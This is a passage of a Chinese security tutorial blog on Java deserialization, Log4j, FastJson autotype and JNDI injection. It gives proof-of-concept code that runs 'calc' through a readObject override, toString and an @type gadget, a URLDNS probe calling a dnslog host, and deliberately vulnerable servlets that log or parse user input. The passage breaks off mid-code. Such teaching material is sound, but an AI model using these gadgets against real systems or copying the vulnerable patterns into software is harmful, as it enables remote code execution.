  <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123; &quot;</span>+<span class="string">&quot;name：&quot;</span>+name+<span class="string">&quot;company：&quot;</span>+company+<span class="string">&quot;age：&quot;</span>+age+<span class="string">&quot; &#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再写一个序列化的文件为SeriaDemo，运行之后可以看到输出了一个s.txt</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeriaDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//创建一个对象u，引用UserDemo</span></span><br><span class="line">        <span class="type">UserDemo</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserDemo</span>(<span class="string">&quot;lisi&quot;</span>,<span class="string">&quot;lv&quot;</span>,<span class="number">33</span>);</span><br><span class="line">        <span class="comment">//调用下面的成员方法</span></span><br><span class="line">        Seria(u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Seria</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//将对象obj序列化之后输出到文件s.txt</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;s.txt&quot;</span>));</span><br><span class="line">        aa.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们反序列化一下，将s.txt的内容反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnseriaDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span>  Unseria(<span class="string">&quot;s.txt&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unseria</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">bb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">cc</span> <span class="operator">=</span> bb.readObject();</span><br><span class="line">        <span class="keyword">return</span> cc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反序列化利用链"><a href="#反序列化利用链" class="headerlink" title="反序列化利用链"></a>反序列化利用链</h2><h3 id="重写入口类readObject"><a href="#重写入口类readObject" class="headerlink" title="重写入口类readObject()"></a>重写入口类readObject()</h3><p>入口类的readObject()直接调用危险方法，最好理解也是最不常见的，举个例子，我们直接在上面的UserDemo文件中添加一段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream osi)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">//指向正确的ReadObject，然后再去执行命令，这样你反序列化出来的东西就不为null，不加的话为null</span></span><br><span class="line">    osi.defaultReadObject();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后执行序列化再执行反序列化的文件，就会弹出计算器</p><p>其实就是你重写了readObject方法，方法里面写入要执行的命令，然后序列化的时候会把UserDemo里面我们自己写的readObject方法写入s.txt文件，然后反序列化的时候执行了你在UserDemo中重写的readObject这个方法，而不是java本身自带的那个readObject</p><h3 id="构造函数等隐式执行"><a href="#构造函数等隐式执行" class="headerlink" title="构造函数等隐式执行"></a>构造函数等隐式执行</h3><p>构造函数&#x2F;静态代码块等类加载时隐式执行，比如我们的UserDemo里面有个toString，我们在里面这么写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;User&#123; &quot;</span>+<span class="string">&quot;name：&quot;</span>+name+<span class="string">&quot;company：&quot;</span>+company+<span class="string">&quot;age：&quot;</span>+age+<span class="string">&quot; &#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时，在反序列化的代码执行后，就会弹出计算器，原因是我们在反序列化的那个demo代码中有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure><p>他对obj这个对象进行输出，默认调用原始对象的<strong>toString</strong>方法，如果你把这一行给注释，就不会有结果回显</p><h3 id="入口参数可控类危险方法"><a href="#入口参数可控类危险方法" class="headerlink" title="入口参数可控类危险方法"></a>入口参数可控类危险方法</h3><p>入口参数中包含可控类，该类有危险方法，比如readObject的调用</p><p>新写一个UrlDns文件，然后在dnslog上get一个域名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDns</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hash = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://7vmei3.dnslog.cn&quot;</span>);</span><br><span class="line">        hash.put(u,<span class="number">1</span>);</span><br><span class="line">      <span class="comment">//序列化对象hash源自于自带的类HashMap，他里面也有readobject方法，在反序列化时用到了它</span></span><br><span class="line">        Seria(hash);</span><br><span class="line">        Unseria(<span class="string">&quot;dns.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unseria</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">bb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">cc</span> <span class="operator">=</span> bb.readObject();</span><br><span class="line">        <span class="keyword">return</span> cc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Seria</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//将对象obj序列化之后输出到文件s.txt</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;dns.txt&quot;</span>));</span><br><span class="line">        aa.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你会发现你请求了这个地址</p><h1 id="第三方组件"><a href="#第三方组件" class="headerlink" title="第三方组件"></a>第三方组件</h1><h2 id="Log4J"><a href="#Log4J" class="headerlink" title="Log4J"></a>Log4J</h2><p>Apache的一个开源项目，通过使用log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日制的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。</p><p>在进行组件搭建时，需要借助Maven，配置参考：<a href="https://www.jb51.net/article/259780.htm">https://www.jb51.net/article/259780.htm</a></p><p>配置完成maven后，新建项目选择maven即可，通过mvn仓库下载 Apache log4j Core，我这里选择了2.14.1版本，然后在下载页面找到maven配置的代码</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211135035044.png" alt="image-20240211135035044"></p><p>将它粘贴到pom.xml中，如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后由于我们之前配置了阿里源，配置代码这里会有一个M的小标志，点一下就会去自动下载，最终我们在外部库中会看到下载的结果</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211135406390.png" alt="image-20240211135406390"></p><p>先写一个简单的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LogManager.getLogger(LogTest.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;$&#123;java:os&#125;&quot;</span>;</span><br><span class="line">        log.error(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下输出结果</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211142826189.png" alt="image-20240211142826189"></p><p>代码执行了，这就是最简单的log4j的原理，在真实的场景下我们需要借助JNDI-Injection-Exploit这个工具，现在我们使用之前学过的Servlet技术写一个简单的可访问的java网站且调用log4j组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.weblog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/log&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebLog</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LogManager.getLogger(WebLog.class);</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">        log.error(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><p>在前后端数据传输交互中，经常会遇到字符串与json，XML等格式相互转换与解析，其中json以跨语言跨前后端的优点在开发中被频繁使用，基本上是标准的数据交换格式，它的接口简单，已经被广泛使用在缓存序列化、协议交互、web输出等各种应用场景中，是阿里巴巴开源库，用于对json格式的数据进行解析和打包</p><p>先通过两个demo进行一个简单测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataDemo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjson转化的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">DataDemo</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataDemo</span>();</span><br><span class="line">        data.setAge(<span class="number">22</span>);</span><br><span class="line">        data.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        System.out.println(data);</span><br><span class="line">        <span class="comment">// 使用fastjson转为j son数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> JSONObject.toJSONString(data);</span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为：</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211161445537.png" alt="image-20240211161445537"></p><p>简单分析一下漏洞原理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> JSONObject.toJSONString(data, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure><p>在后面加一个东西，我们可以看一下输出结果</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211161915462.png" alt="image-20240211161915462"></p><p>其实在转化的时候前面有个@type的东西，数据就是类包，上述是将对象转为Json，接下来我们将Json转为对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.DataDemo\&quot;,\&quot;age\&quot;:22,\&quot;name\&quot;:\&quot;zhangsan\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jsontest</span> <span class="operator">=</span> JSON.parseObject(test);</span><br><span class="line">System.out.println(jsontest);</span><br></pre></td></tr></table></figure><p>此时输出结果就是 <strong>{“name”:”zhangsan”,”age”:22}</strong></p><p>如果我们在同一目录下新建一个名为Run的类，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Run</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时，在将Json转为对象时我们这么写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Run\&quot;,\&quot;age\&quot;:22,\&quot;name\&quot;:\&quot;zhangsan\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">jsontest</span> <span class="operator">=</span> JSON.parseObject(test);</span><br><span class="line">System.out.println(jsontest);</span><br></pre></td></tr></table></figure><p>然后再运行你就会发现执行了Run这个类里面弹出计算器的命令</p><h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>Java Naming and Directory Interface （Java命名和目录接口），JNDI提供统一的客户端API，通过不同的服务供应接口（SPI）的实现，由管理者将JNDI API映射为特定的命名服务和目录服务，使得JAVA应用程序可以通过JNDI实现和这些命名服务和目录服务之间的交互</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211145553826.png" alt="image-20240211145553826"></p><p>其中最常用的为 <strong>RMI</strong>：远程方法调用注册表    <strong>ldap</strong>：轻量级目录访问协议</p><h2 id="调用检索"><a href="#调用检索" class="headerlink" title="调用检索"></a>调用检索</h2><p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI和LDAP等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.InitialContext.lookup()</span><br></pre></td></tr></table></figure><p>此方法专门用来实现JNDI注入，写个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="comment">// 创建一个rmi或ldap等服务调用</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ini</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="comment">// 调用rmi或ldap等服务对象类（远程）</span></span><br><span class="line">        ini.lookup(<span class="string">&quot;xxxxxxxxxxxxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中xxxxxxxxxxx是通过JNDI-Exploit来生成的rmi或ldap的payload</p><p>还有一款工具：marshalsec，这款工具需要你自己写一个代码执行的java文件，然后编译成class文件上传到服务器上，然后通过工具生成class访问路径，一般payload中ldap协议对应1389端口，rmi协议对应1099端口</p><p>除此之外，你会发现不同的JDK版本的RMI和LDAP未必都可以成功利用，不过很多工具里面都有内置的绕过</p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211184228734.png" alt="image-20240211184228734"></p><p><img src="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/image-20240211184706485.png" alt="image-20240211184706485"></p><h2 id="FastJson与JNDI注入"><a href="#FastJson与JNDI注入" class="headerlink" title="FastJson与JNDI注入"></a>FastJson与JNDI注入</h2><p>利用之前第三方组件中FastJson处的内容搭建一个小靶场，pol.xml文件中写入fastjson插件，在index.jsp中添加：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;/demo_war_exploded/fj&quot;</span>  method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;js&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;up&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>就是将输入框中输入的数据提交到fj这个地址，然后我们创建一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> 